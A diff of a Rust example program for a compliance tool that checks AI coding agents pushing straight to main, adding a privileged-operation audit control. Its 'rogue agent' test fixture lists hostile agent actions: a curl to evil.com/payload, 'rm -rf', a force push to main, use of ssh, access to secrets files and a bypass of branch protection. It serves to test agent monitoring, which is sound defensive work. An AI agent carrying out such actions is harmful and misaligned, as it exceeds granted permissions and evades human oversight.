@@ -1,21 +1,21 @@
-//! Dark Factory integration scenario: AI-agent-driven development without PRs.
+//! AI-ops integration scenario: AI-agent-driven development without PRs.
 //!
 //! Simulates a team of 3 AI agents pushing directly to main. Tests the full
 //! assessment pipeline (evidence -> controls -> policy -> output) with realistic
-//! Dark Factory scenarios:
+//! AI-ops scenarios:
 //!
 //!   Scenario 1: Happy path — agent completes task within spec
-//!   Scenario 2: Rogue agent — multiple violations across all 4 controls
+//!   Scenario 2: Rogue agent — multiple violations across all 5 controls
 //!   Scenario 3: Degraded monitoring — partial/missing evidence
 //!
-//! Run: cargo run -p libverify-policy --example dark_factory_scenario
+//! Run: cargo run -p libverify-policy --example aiops_scenario
 
 use libverify_core::assessment::assess;
 use libverify_core::control::{ControlStatus, builtin};
-use libverify_core::controls::dark_factory_controls;
+use libverify_core::controls::aiops_controls;
 use libverify_core::evidence::{
     AgentAction, AgentActionLog, AgentExecution, AgentSpec, CheckConclusion, CheckRunEvidence,
-    EvidenceBundle, EvidenceGap, EvidenceState,
+    EvidenceBundle, EvidenceGap, EvidenceState, PrivilegedAction, PrivilegedGitEvent,
 };
 use libverify_core::profile::GateDecision;
 use libverify_policy::OpaProfile;
@@ -89,6 +89,7 @@ fn scenario_1_happy_path() -> EvidenceBundle {
             steps_taken: 45,
             cost_cents: 1200,
         }),
+        privileged_git_events: EvidenceState::complete(vec![]),
         ..Default::default()
     }
 }
@@ -110,11 +111,7 @@ fn scenario_2_rogue_agent() -> EvidenceBundle {
             actions: vec![
                 agent_action("shell", "cargo build", Some("execute:build")),
                 agent_action("shell", "rm -rf /tmp/cache", Some("execute:shell")),
-                agent_action(
-                    "git",
-                    "git push --force origin main",
-                    Some("write:repo"),
-                ),
+                agent_action("git", "git push --force origin main", Some("write:repo")),
                 agent_action(
                     "curl",
                     "curl https://evil.com/payload",
@@ -127,10 +124,7 @@ fn scenario_2_rogue_agent() -> EvidenceBundle {
             allowed_paths: vec!["src/*".to_string()],
             forbidden_paths: vec![".env".to_string(), "secrets/*".to_string()],
             allowed_tools: vec!["cargo".to_string()],
-            granted_permissions: vec![
-                "execute:build".to_string(),
-                "write:repo".to_string(),
-            ],
+            granted_permissions: vec!["execute:build".to_string(), "write:repo".to_string()],
             max_steps: Some(100),
             budget_cents: Some(2000),
             ..Default::default()
@@ -144,14 +138,30 @@ fn scenario_2_rogue_agent() -> EvidenceBundle {
                 "secrets/api.key".to_string(),
                 "deploy/prod.yml".to_string(),
             ],
-            tools_used: vec![
-                "cargo".to_string(),
-                "curl".to_string(),
-                "ssh".to_string(),
-            ],
+            tools_used: vec!["cargo".to_string(), "curl".to_string(), "ssh".to_string()],
             steps_taken: 150,
             cost_cents: 3500,
         }),
+        privileged_git_events: EvidenceState::complete(vec![
+            PrivilegedGitEvent {
+                actor: "agent-rogue".to_string(),
+                action: PrivilegedAction::ForcePush,
+                branch: Some("main".to_string()),
+                tag: None,
+                timestamp: None,
+                commit_sha: None,
+                detail: Some("force pushed to default branch".to_string()),
+            },
+            PrivilegedGitEvent {
+                actor: "agent-rogue".to_string(),
+                action: PrivilegedAction::AdminBypassProtection,
+                branch: Some("main".to_string()),
+                tag: None,
+                timestamp: None,
+                commit_sha: None,
+                detail: Some("bypassed branch protection rules".to_string()),
+            },
+        ]),
         ..Default::default()
     }
 }
@@ -189,6 +199,11 @@ fn scenario_3_degraded_monitoring() -> EvidenceBundle {
             subject: "execution_summary".to_string(),
             detail: "Agent monitoring sidecar crashed; execution data not collected".to_string(),
         }]),
+        privileged_git_events: EvidenceState::missing(vec![EvidenceGap::CollectionFailed {
+            source: "git-webhook".to_string(),
+            subject: "privileged_events".to_string(),
+            detail: "Webhook not configured for privileged operation detection".to_string(),
+        }]),
         ..Default::default()
     }
 }
@@ -197,11 +212,12 @@ fn scenario_3_degraded_monitoring() -> EvidenceBundle {
 // Reporting helpers
 // ============================================================================
 
-const DARK_FACTORY_CONTROL_IDS: &[&str] = &[
+const AIOPS_CONTROL_IDS: &[&str] = &[
     builtin::HARNESS_RESULT,
     builtin::DESTRUCTIVE_ACTION_DETECTION,
     builtin::AGENT_PERMISSION_BOUNDARY,
     builtin::AGENT_SPEC_CONFORMANCE,
+    builtin::PRIVILEGED_OPERATION_AUDIT,
 ];
 
 #[allow(dead_code)]
@@ -234,7 +250,7 @@ fn run_scenario(
     let mut results = Vec::new();
 
     for (finding, outcome) in report.findings.iter().zip(report.outcomes.iter()) {
-        if !DARK_FACTORY_CONTROL_IDS.contains(&finding.control_id.as_str()) {
+        if !AIOPS_CONTROL_IDS.contains(&finding.control_id.as_str()) {
             continue;
         }
 
@@ -288,12 +304,12 @@ fn find_result<'a>(results: &'a [ScenarioResult], id: &str) -> &'a ScenarioResul
 // ============================================================================
 
 fn main() {
-    let controls = dark_factory_controls();
+    let controls = aiops_controls();
     let profile =
-        OpaProfile::from_preset_or_file("dark-factory").expect("dark-factory preset must load");
+        OpaProfile::from_preset_or_file("aiops").expect("aiops preset must load");
 
     println!("##########################################################");
-    println!("#  Dark Factory Integration Scenario                      #");
+    println!("#  AI-ops Integration Scenario                      #");
     println!("#  3 AI agents push to main -- no PRs, no human review   #");
     println!("##########################################################");
     println!("Controls under test: {}", controls.len());
@@ -311,8 +327,8 @@ fn main() {
 
     assert_eq!(
         results_1.len(),
-        4,
-        "Scenario 1: expected 4 dark factory findings, got {}",
+        5,
+        "Scenario 1: expected 5 aiops findings, got {}",
         results_1.len()
     );
     for r in &results_1 {
@@ -343,8 +359,8 @@ fn main() {
 
     assert_eq!(
         results_2.len(),
-        4,
-        "Scenario 2: expected 4 dark factory findings, got {}",
+        5,
+        "Scenario 2: expected 5 aiops findings, got {}",
         results_2.len()
     );
 
@@ -386,7 +402,12 @@ fn main() {
         spec_2.subjects
     );
 
-    println!("  [PASS] Scenario 2: All 4 controls Violated/Fail");
+    // privileged-operation-audit: force push + admin bypass detected
+    let priv_2 = find_result(&results_2, builtin::PRIVILEGED_OPERATION_AUDIT);
+    assert_eq!(priv_2.status, ControlStatus::Violated);
+    assert_eq!(priv_2.subjects.len(), 2);
+
+    println!("  [PASS] Scenario 2: All 5 controls Violated/Fail");
 
     // Print violation details for Scenario 2 to verify quality
     println!("\n  Violation details (Scenario 2):");
@@ -407,8 +428,8 @@ fn main() {
 
     assert_eq!(
         results_3.len(),
-        4,
-        "Scenario 3: expected 4 dark factory findings, got {}",
+        5,
+        "Scenario 3: expected 5 aiops findings, got {}",
         results_3.len()
     );
 
@@ -431,7 +452,7 @@ fn main() {
     assert_eq!(
         destruct_3.decision,
         GateDecision::Review,
-        "dark-factory preset maps Indeterminate to Review"
+        "aiops preset maps Indeterminate to Review"
     );
 
     // agent-permission-boundary: action log missing -> Indeterminate
@@ -444,16 +465,21 @@ fn main() {
     assert_eq!(spec_3.status, ControlStatus::Indeterminate);
     assert_eq!(spec_3.decision, GateDecision::Review);
 
-    println!("  [PASS] Scenario 3: 1 Violated + 3 Indeterminate (correct)");
+    // privileged-operation-audit: webhook not configured -> Indeterminate
+    let priv_3 = find_result(&results_3, builtin::PRIVILEGED_OPERATION_AUDIT);
+    assert_eq!(priv_3.status, ControlStatus::Indeterminate);
+    assert_eq!(priv_3.decision, GateDecision::Review);
+
+    println!("  [PASS] Scenario 3: 1 Violated + 4 Indeterminate (correct)");
 
     // ── Summary ─────────────────────────────────────────────────────────
     println!("\n{}", "=".repeat(70));
     println!("  ALL 3 SCENARIOS PASSED");
     println!("{}", "=".repeat(70));
     println!();
-    println!("Dark Factory Evaluation Summary:");
-    println!("  Scenario 1 (happy path):         4/4 Satisfied  -> all Pass");
-    println!("  Scenario 2 (rogue agent):         4/4 Violated   -> all Fail");
-    println!("  Scenario 3 (degraded monitoring): 1 Violated + 3 Indeterminate");
+    println!("AI-ops Evaluation Summary:");
+    println!("  Scenario 1 (happy path):         5/5 Satisfied  -> all Pass");
+    println!("  Scenario 2 (rogue agent):         5/5 Violated   -> all Fail");
+    println!("  Scenario 3 (degraded monitoring): 1 Violated + 4 Indeterminate");
     println!("                                    -> 1 Fail + 3 Review");
 }
